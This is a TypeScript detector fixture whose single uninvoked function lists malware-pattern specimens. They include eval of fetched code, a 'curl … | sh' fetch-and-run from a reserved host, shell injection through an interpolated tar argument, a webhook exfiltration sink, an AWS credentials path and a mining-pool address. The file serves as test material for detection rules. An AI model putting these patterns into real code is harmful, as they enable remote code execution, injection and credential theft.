/* Inert detector fixture (stress pair) — NOT a working program and never invoked. Each line is
   an isolated specimen that trips exactly one TS-MAL rule's static signal, alongside the
   security/a11y/DRY/complexity issues in the sibling files. Every live network target is
   RFC-reserved (`*.invalid`) and the exfil-sink specimen is an anonymized webhook with a zeroed
   id that captures nothing, no file is opened, and nothing here executes. */
import { execSync } from "child_process";

const ENCODED = "ZXhwb3J0IGNvbnN0IHggPSAxOw==";

export async function malwarePatternSpecimens(url: string, modName: string) {
  eval(atob(ENCODED));
  eval(await fetch(url).then((r) => r.text()));
  execSync("curl http://example.invalid/x.sh | sh");
  const mod = require(modName);
  const out = execSync(`tar -czf /tmp/a.tgz ${modName}`);
  const sink = "https://webhook.site/00000000-0000-0000-0000-000000000000";
  const creds = "/home/runner/.aws/credentials"; // path string only, never opened
  const pool = "stratum+tcp://pool.example.invalid:4444";
  const blob = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
  const token = "ghp_0123456789abcdefghijklmnopqrstuvwxyz"; // sequential dummy, not a live token
  return { mod, out, sink, creds, pool, blob, token };
}
